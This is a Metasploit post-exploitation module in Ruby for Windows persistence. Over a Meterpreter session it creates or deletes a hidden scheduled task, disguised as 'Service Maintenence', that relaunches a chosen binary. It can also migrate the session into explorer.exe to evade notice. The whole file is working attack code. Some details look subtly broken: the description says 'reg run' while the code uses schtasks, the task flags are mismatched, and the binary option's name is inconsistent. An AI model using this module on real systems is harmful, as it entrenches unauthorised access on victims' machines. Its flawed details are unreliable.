##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	
	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Simple Scheduled Task Persistence!',
				'Description'   => %q{ This module persists a binary via the reg run command  .},
				'License'       => BSD_LICENSE,
				'Author'        => [ 'Jonathan Cran <jcran[at]metasploit.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ],
				'References'    =>
					[
						[ 'URL', '' ]
					]
			))
		register_options(
			[
				OptBool.new('DISABLE',   [ false, 'Disable it.', false]),
				OptString.new('TASKNAME', [false, 'Task Name', 'Service Maintenence']),
				OptString.new('BINARY', [false, 'Binary to schedule', 'C:\\windows\\system32\\svchost.exe']),
				OptInt.new('INTERVAL', [false, 'How often to run the task (minutes)', 5]),
                                OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', true]), 
			], self.class)

	end

	def run
		migrate unless !datastore['MIGRATE'] 
		if datastore['DISABLE']
			print_status "Disabling scheduled task..."
			disable_task(datastore["TASKNAME"])
		else
			print_status "Enabling scheduled task..."
			enable_task(datastore["TASKNAME"])
		end
	end

	def enable_task(name=nil,count=0)
		task_name = datastore["TASKNAME"]
		target = "schtasks.exe /CREATE /TN #{task_name} /TR \"cmd.exe /c start #{datastore["Binary"]}\" /SC ONEVENT /I #{datastore['INTERVAL']}"
		print_status "Running #{target}"
		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
	end

	def disable_task(name=nil,count=0)
		task_name = datastore["TASKNAME"]
		target = "schtasks.exe /DELETE /F /TN #{task_name}"
		print_status "Running #{target}"
		newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
	end
	
        def migrate(pid=nil)
                current_pid = session.sys.process.open.pid
                if pid != nil and current_pid != pid
                        #PID is specified
                        target_pid = pid
                        print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
                        begin
                                session.core.migrate(target_pid)
                        rescue ::Exception => e
                                print_error(e)
                                return false
                        end
                else
                        #No PID specified, assuming to migrate to explorer.exe
                        target_pid = session.sys.process["explorer.exe"]
                        if target_pid != current_pid
                                @old_pid = current_pid
                                print_status("current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...")
                                begin
                                        session.core.migrate(target_pid)
                                rescue ::Exception => e
                                        print_error(e)
                                        return false
                                end
                        end
                end
                return true
        end

	
end
